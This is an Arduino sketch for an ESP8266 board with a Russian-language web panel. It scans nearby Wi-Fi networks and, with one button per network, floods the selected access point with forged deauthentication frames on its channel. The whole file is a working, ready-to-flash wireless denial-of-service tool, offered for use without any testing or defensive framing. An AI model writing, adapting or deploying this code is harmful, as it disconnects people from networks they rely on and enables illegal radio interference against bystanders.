#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
}

const char* ap_ssid = "My_Custom_Deauther";
const char* ap_password = "password123";

ESP8266WebServer server(80);

bool attack_active = false;
uint8_t target_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
int target_channel = 1;
String scan_results_html = "";

uint8_t deauth_packet[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Custom Deauther</title>";
  html += "<style>body{font-family:Arial,sans-serif;background:#121212;color:#e0e0e0;text-align:center;padding:20px;}";
  html += ".btn{background:#2196F3;color:white;border:none;padding:12px 24px;font-size:16px;margin:10px;cursor:pointer;border-radius:4px;}";
  html += ".btn-stop{background:#f44336;} .btn-scan{background:#4CAF50;}";
  html += ".box{background:#1e1e1e;padding:20px;border-radius:8px;max-width:500px;margin:0 auto 20px auto;box-shadow:0 4px 6px rgba(0,0,0,0.3);}";
  html += "table{width:100%;border-collapse:collapse;margin-top:15px;} th,td{padding:10px;border-bottom:1px solid #333;text-align:left;font-size:14px;}";
  html += "</style></head><body>";

  html += "<h1>📡 My ESP8266 Deauther</h1>";

  html += "<div class='box'>";
  html += "<h3>Статус системы</h3>";
  if (attack_active) {
    html += "<p style='color:#f44336;font-weight:bold;'>Идет атака на канал " + String(target_channel) + "</p>";
    html += "<p>Цель (MAC): ";
    for(int i=0; i<6; i++) {
      html += String(target_mac[i], HEX) + (i < 5 ? ":" : "");
    }
    html += "</p>";
    html += "<a href='/stop'><button class='btn btn-stop'>Остановить</button></a>";
  } else {
    html += "<p style='color:#4CAF50;font-weight:bold;'>Ожидание действий</p>";
    html += "<a href='/scan'><button class='btn btn-scan'>Сканировать эфир</button></a>";
  }
  html += "</div>";

  html += "<div class='box'>";
  html += "<h3>Доступные Wi-Fi сети вокруг</h3>";
  if (scan_results_html == "") {
    html += "<p style='color:#888;'>Нажмите кнопку выше, чтобы запустить сканирование.</p>";
  } else {
    html += "<table><tr><th>SSID (Имя)</th><th>Ch</th><th>Сигнал</th><th>Действие</th></tr>";
    html += scan_results_html;
    html += "</table>";
  }
  html += "</div>";

  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleScan() {
  attack_active = false;
  wifi_promiscuous_enable(0);
  
  scan_results_html = "";
  int n = WiFi.scanNetworks(false, true);

  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    if(ssid == "") ssid = "*Скрытая сеть*";
    
    int ch = WiFi.channel(i);
    int rssi = WiFi.RSSI(i);
    String bssid_str = WiFi.BSSIDstr(i);

    scan_results_html += "<tr>";
    scan_results_html += "<td>" + ssid + "</td>";
    scan_results_html += "<td>" + String(ch) + "</td>";
    scan_results_html += "<td>" + String(rssi) + " dBm</td>";
    scan_results_html += "<td><a href='/attack?bssid=" + bssid_str + "&ch=" + String(ch) + "'><button class='btn' style='padding:5px 10px;font-size:12px;margin:0;'>Атака</button></a></td>";
    scan_results_html += "</tr>";
  }
  
  WiFi.softAP(ap_ssid, ap_password);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleAttack() {
  if (server.hasArg("bssid") && server.hasArg("ch")) {
    String bssid_str = server.arg("bssid");
    target_channel = server.arg("ch").toInt();

    unsigned int mac_bytes[6];
    
    if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x", 
               &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], 
               &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
               
      for (int i = 0; i < 6; i++) {
        target_mac[i] = (uint8_t)mac_bytes[i];
        deauth_packet[10 + i] = target_mac[i];
        deauth_packet[16 + i] = target_mac[i];
      }
      attack_active = true;
    }
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStop() {
  attack_active = false;
  wifi_promiscuous_enable(0);
  WiFi.softAP(ap_ssid, ap_password);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(500);

  // Инициализация точки доступа ESP8266
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  
  Serial.println("");
  Serial.print("Точка доступа запущена. Сеть: ");
  Serial.println(ap_ssid);
  Serial.print("IP адрес панели управления: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);
  
  server.begin();
}

void loop() {
  server.handleClient();

  if (attack_active) {
    wifi_promiscuous_enable(1);
    wifi_set_channel(target_channel);

    for (int i = 0; i < 5; i++) {
      wifi_send_pkt_freedom(deauth_packet, sizeof(deauth_packet), 0);
      delay(2);
    }

    wifi_promiscuous_enable(0);

    delay(20); 
  }
}
